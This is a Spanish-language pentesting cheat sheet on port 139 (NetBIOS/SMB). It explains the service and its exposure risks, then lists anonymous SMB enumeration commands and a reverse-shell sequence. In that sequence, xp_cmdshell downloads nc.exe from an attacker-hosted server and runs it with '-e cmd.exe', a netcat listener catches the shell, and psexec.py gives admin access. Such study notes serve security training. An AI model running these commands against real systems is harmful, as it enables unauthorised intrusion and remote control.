📌 El puerto 139 está asociado a NetBIOS Session Service, utilizado en redes Windows antiguas para compartir archivos e impresoras.

    NetBIOS (Network Basic Input/Output System) es un sistema que permite a equipos Windows:

        📂 Compartir archivos
        🖨️ Compartir impresoras
        👤 Autenticación en red
        🔐 Comunicación en Active Directory

    En redes modernas suele funcionar sobre TCP/IP.

⚙️ ¿Qué hace el puerto 139?

    Comparticiones SMB antiguas
    Redes Windows previas a Windows 2000

🔐 En ciberseguridad

    Si el puerto 139 está abierto:

        Indica sistema Windows
        Puede permitir enumeración de recursos compartidos
        Puede revelar usuarios y nombres de máquina
        Puede usarse para ataques SMB antiguos

    ⚠️ Si está expuesto a Internet → mala práctica.

🧪 En pentesting

    Se revisa junto a:

        135 (RPC)
        445 (SMB)
        88 (Kerberos)
        389 (LDAP)


🎯 Ejemplo de uso

    Listado recursos con acceso anónimo

        smbclient -L //<IP> -N

		-N → No password 
		-L → List

    Acceso a un recurso mediante acceso anónimo

        smbclient //<IP>/<RECURSO> -N

    Acceso con usuario y contraseña	        

        smbmap -H <IP> -u 'a' -p 'a'

    🖥️ Reverse Shell

        · Comprobar si existe el directorio
		
            EXEC xp_cmdshell 'dir C:\Users\Public\';

        · Ejecutar el servidor
		
            python3 -m http.server 80

        · Inyectar el ejecutable (https://eternallybored.org/misc/netcat/)
		
            EXEC xp_cmdshell "powershell -c Invoke-WebRequest 'http://<IP_USER>/nc.exe' -OutFile 'C:\Users\Public\nc.exe'";

        · Abrir puerto (Listener)
		
            nc -lvnp 9999

        · Hacer la reverse Shell
		
            EXEC xp_cmdshell " C:\Users\Public\nc.exe <IP_USER> 9999 -e cmd.exe";

        · Conexión modo administrador
		
            psexec.py <DOMAIN_NAME>/<ROOT_USER>@<IP_MÁQUINA>
